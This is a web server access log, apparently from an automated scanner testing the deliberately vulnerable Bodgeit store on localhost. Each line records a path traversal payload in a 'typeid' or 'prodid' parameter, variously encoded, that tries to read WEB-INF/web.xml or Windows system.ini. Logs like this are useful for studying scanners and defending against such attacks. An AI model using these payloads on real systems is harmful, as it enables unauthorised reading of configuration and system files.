127.0.0.1 - - [20/Mar/2017:12:47:39 +1300] "GET /bodgeit/product.jsp?typeid=%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:39 +1300] "GET /bodgeit/product.jsp?typeid=..%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:39 +1300] "GET /bodgeit/product.jsp?typeid=..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:39 +1300] "GET /bodgeit/product.jsp?typeid=%2F..%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:39 +1300] "GET /bodgeit/product.jsp?typeid=%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:39 +1300] "GET /bodgeit/product.jsp?typeid=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:40 +1300] "GET /bodgeit/product.jsp?prodid=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:40 +1300] "GET /bodgeit/product.jsp?prodid=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:40 +1300] "GET /bodgeit/product.jsp?prodid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:40 +1300] "GET /bodgeit/product.jsp?prodid=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 2313
127.0.0.1 - - [20/Mar/2017:12:47:40 +1300] "GET /bodgeit/product.jsp?prodid=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 2313
